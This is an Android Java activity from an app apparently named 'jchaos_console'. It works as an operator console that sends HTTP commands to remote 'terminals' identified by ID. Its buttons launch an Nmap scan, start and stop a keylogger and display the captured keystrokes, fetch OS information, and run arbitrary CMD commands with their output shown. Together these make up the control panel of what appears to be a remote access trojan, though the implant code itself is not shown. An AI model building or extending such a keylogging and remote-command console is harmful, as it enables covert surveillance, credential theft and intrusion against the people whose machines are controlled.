package com.example.jchaos_console.activity;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;

import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

import com.example.jchaos_console.Config.Config;
import com.example.jchaos_console.R;
import com.example.jchaos_console.adapter.TerminalAdapter;
import com.example.jchaos_console.bundleBean.TerminalBundle;
import com.example.jchaos_console.http.TerminalHttp;

import java.util.Set;

public class TerminalControlActivity extends AppCompatActivity {

    private Button NmapButton;
    private TextView NmapView;
    private ActivityInfo activityInfo;
    private TerminalHttp terminalHttp;
    private TextView getOsText;
    private Handler myHandler;
    private Button StartKeyLoggerButton;
    private Button EndKeyLoggerButton;
    private TextView KeyLoggerTextView;
    private EditText cmdEditTextView;
    private TextView cmdShowTextView;
    private Button execCmdButton;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_terminal_control);
        Bundle bundle = this.getIntent().getExtras();
        TerminalBundle terminalBundle = (TerminalBundle) (bundle != null ? bundle.get("TerminalInfo") : null);
        init();
        if (terminalBundle != null) {
            NmapView.setText(terminalBundle.getTerminalID());
            activityInfo.terminalID = terminalBundle.getTerminalID();
        }
        myHandler = new Handler(Looper.getMainLooper()) {
            @Override
            public void handleMessage(Message msg) {
                String jsonstring;
                switch (msg.what) {
                    case 123:

                    case Config.Result_Code_ReturnOsInfo:
                        jsonstring = (String) msg.getData().get("osInfoString");
                        System.out.println("wdnmd：" + jsonstring);

                        getOsText.setText(jsonstring);
                        break;
                    case Config.Result_Code_ReturnKeyLogger:
                        jsonstring = (String) msg.getData().get("osInfoString");
                        if (jsonstring.equals("")) {
                            KeyLoggerTextView.setText("没有监听到消息");
                        } else {
                            KeyLoggerTextView.setText("键盘监听信息：" + jsonstring);
                        }
                        break;
                    case Config.Request_Code_Result_Code_Cmd:
                        jsonstring = (String) msg.getData().get("osInfoString");
                        if (jsonstring.equals("")) {
                            cmdShowTextView.setText("没有监听到消息");
                        } else {
                            cmdShowTextView.setText("CMD返回信息：" + jsonstring);
                        }
                        break;


                    default:
                        break;
                }
                super.handleMessage(msg);
            }
        };

    }

    public void init() {

        activityInfo = new ActivityInfo();
        terminalHttp = new TerminalHttp();
        NmapButton = findViewById(R.id.NmapButton);
        NmapView = findViewById(R.id.NmapText);
        getOsText = findViewById(R.id.TerminalGetOsInfo);
        StartKeyLoggerButton = findViewById(R.id.StartKeyLoggerButton);
        EndKeyLoggerButton = findViewById(R.id.EndKeyLoggerButton);
        KeyLoggerTextView = findViewById(R.id.KeyLoggerTextView);
        cmdEditTextView = findViewById(R.id.CmdEditTextView);
        cmdShowTextView = findViewById(R.id.CmdShowTextView);
        execCmdButton = findViewById(R.id.ExecCmdButton);
        setListener();
        initView();
    }

    public void initView() {
        new Thread(new Runnable() {
            @RequiresApi(api = Build.VERSION_CODES.KITKAT)
            @Override
            public void run() {
                /**
                 * 初始化系统信息
                 */
                String osInfoString = terminalHttp.getOsInfo(activityInfo.terminalID);
                System.out.println(osInfoString);
                Bundle bundle = new Bundle();
                bundle.putSerializable("osInfoString", osInfoString);
                Message message = new Message();
                message.setData(bundle);
                message.what = Config.Result_Code_ReturnOsInfo;
                myHandler.sendMessage(message);
            }
        }).start();
    }

    public void setListener() {
        /**
         * Nmap Button
         */
        NmapButton.setOnClickListener(new View.OnClickListener() {
            @RequiresApi(api = Build.VERSION_CODES.KITKAT)
            @Override
            public void onClick(View v) {
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        terminalHttp.sendRunNmap(activityInfo.terminalID);
                    }
                }).start();

            }
        });

        StartKeyLoggerButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                new Thread(new Runnable() {
                    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
                    @Override
                    public void run() {

                        String resultCode = terminalHttp.sendStartKeyLogger(activityInfo.terminalID);
                        switch (resultCode) {
                            case "2001":
                                System.out.println("2001");
                            case "2002":
                                System.out.println("2002");
                        }
                    }
                }).start();
            }
        });

        EndKeyLoggerButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                new Thread(new Runnable() {
                    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
                    @Override
                    public void run() {

                        String resultMsg = terminalHttp.sendEndKeyLogger(activityInfo.terminalID);
                        if (resultMsg == null) {
                            System.out.println("no msg");
                        }
                        System.out.println("returnString:" + resultMsg);
                        System.out.println(resultMsg);
                        Bundle bundle = new Bundle();
                        bundle.putSerializable("osInfoString", resultMsg);
                        Message message = new Message();
                        message.setData(bundle);
                        message.what = Config.Result_Code_ReturnKeyLogger;
                        myHandler.sendMessage(message);
                        switch (resultMsg) {
                            case "2004":
                                System.out.println("2004");
                            case "2003":
                                System.out.println("2003");

                        }
                    }
                }).start();
            }
        });

        execCmdButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                new Thread(new Runnable() {
                    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
                    @Override
                    public void run() {
                        String resultMsg = terminalHttp.execCmdCommand(activityInfo.terminalID, cmdEditTextView.getText().toString());
                        System.out.println(cmdEditTextView.getText().toString());
                        Bundle bundle = new Bundle();
                        bundle.putSerializable("osInfoString", resultMsg);
                        Message message = new Message();
                        message.setData(bundle);
                        message.what = Config.Request_Code_Result_Code_Cmd;
                        myHandler.sendMessage(message);
                    }
                }).start();
            }
        });

    }

    class ActivityInfo {
        public String terminalID;
    }
}
